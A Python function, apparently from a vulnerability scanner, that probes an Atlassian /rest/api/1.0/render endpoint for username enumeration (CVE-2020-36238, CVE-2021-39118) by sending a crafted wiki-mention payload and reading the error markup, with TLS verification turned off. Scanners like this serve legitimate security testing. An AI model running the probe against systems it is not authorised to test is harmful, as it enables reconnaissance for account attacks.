import requests
from colorama import Fore, Style

def check_cve_2020_36238(base_url):
    """
    Checks for the vulnerability in /rest/api/1.0/render that allows remote attackers
    to determine if a username is valid via a missing permissions check.
    CVE-2020-36238
    CVE-2021-39118
    """
    print(f"\n{Fore.YELLOW}INFO: Checking for CVE Render Username Leak{Style.RESET_ALL}")
    
    vulnerabilities = ''
    headers = {
        'X-Atlassian-Token': 'no-check',
        'Content-Type': 'application/json'
    }

    # Example payload to check for username validation
    payload = {
        "rendererType": "atlassian-wiki-renderer",
        "unrenderedMarkup": "[~nonexistentuser]"
    }
    
    try:
        # Construct the target URL
        render_url = f"{base_url.rstrip('/')}/rest/api/1.0/render"
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {render_url}")

        # Send the POST request with the payload
        response = requests.post(render_url, headers=headers, json=payload, allow_redirects=False, verify=False)

        # Handle the response
        if response.status_code == 200:
            if "<span class=\"error\">" in response.text:
                vulnerability_detail = f"+ [INFO DISCLOSURE] Potential username enumeration via /rest/api/1.0/render: {render_url}"
                vulnerabilities += vulnerability_detail
                print(f"{Fore.GREEN}[+] [INFO DISCLOSURE] Username enumeration possible: {render_url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}- No username enumeration detected for /rest/api/1.0/render{Style.RESET_ALL}")
        elif response.status_code == 404:
            print(f"{Fore.YELLOW}- Not Found (404): Endpoint /rest/api/1.0/render not accessible{Style.RESET_ALL}")
        elif response.status_code == 401:
            print(f"{Fore.YELLOW}- Unauthorized (401): Authentication required for /rest/api/1.0/render{Style.RESET_ALL}")
        elif response.status_code == 302:
            location = response.headers.get("Location", "No Location header found")
            print(f"{Fore.YELLOW}- Redirected (302) to {location}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}- HTTP {response.status_code}: No vulnerability detected in /rest/api/1.0/render{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}* An error occurred while checking {base_url}: {e}{Style.RESET_ALL}")

    return vulnerabilities  # Return the discovered vulnerabilities
